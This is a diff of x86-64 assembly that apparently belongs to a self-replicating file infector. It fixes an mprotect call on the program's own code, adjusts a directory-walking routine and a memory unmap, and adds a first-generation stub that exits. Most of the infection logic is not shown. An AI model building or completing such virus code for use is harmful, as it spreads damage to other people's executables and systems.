@@ -23,35 +23,24 @@ sc:
 				cmp				rcx,				rbx
 				je				.end
 
-				mov				byte[rsp+rcx],		0
+				mov				byte[rsp+24+rcx],	0
 				inc				rcx
 				jmp				.loop
 .end:
-				lea				rdi,				sc_data
+				mov				rdi,				sc_data
 				and				rdi,				0xfffffffffffff000
-
-				xor				rsi,				rsi
-				mov				rax,				qword[rsp+24+0x28]
-				mov				rbx,				1024
-				div				rbx
-
-				cmp				rdx,				0
-				je				.no_round
-				mov				rsi,				1024
-.no_round:
-				mul				rbx
-				add				rsi,				rax
-
-				mov				rdx,				7
+				mov				rsi,				sc_data_end - sc_data
+				add				rsi,				0x1000
 				mov				rax,				10
 				syscall
 
-				lea				qword[sc_glob],		[rsp+24]
+				mov				qword[sc_glob],		rsp
+				add				qword[sc_glob],		24
 
-				lea				rdi,				[sc_dir_1]
+				mov				rdi,				sc_dir_1
 				call			sc_proc_dir
 
-				lea				rdi,				[sc_dir_2]
+				mov				rdi,				sc_dir_2
 				call			sc_proc_dir
 
 				pop				rdx
@@ -170,9 +159,8 @@ sc_proc_entries:
 				add				rdi,				0x60
 				call			sc_write_mem
 .unmap:
-				mov				rdi,				qword[sc_glob]
-				mov				rsi,				rdi
-				add				rdi,				0xc60
+				mov				rsi,				qword[sc_glob]
+				mov				rdi,				qword[rsi+0xc60]
 				mov				rsi,				qword[rsi+0x18]
 				mov				rax,				11
 				syscall
@@ -189,7 +177,6 @@ sc_proc_entries:
 				pop				rbp
 				ret
 sc_update_mem:
-
 				ret
 sc_end:
 
@@ -201,7 +188,7 @@ sc_dir_2:
 sc_entry:
 				dq				sc
 sc_real_entry:
-				dq				sc_end
+				dq				sc_first_real_entry
 sc_glob:
 				dq				0	; +0x18 -> sz.mem
 									; +0x20 -> sz.code
@@ -221,3 +208,8 @@ sc_glob:
 									; +0xc60 -> *mem
 									; +0xc68 -> x_pad
 sc_data_end:
+
+sc_first_real_entry:
+				xor				rdi,				rdi
+				mov				rax,				60
+				syscall
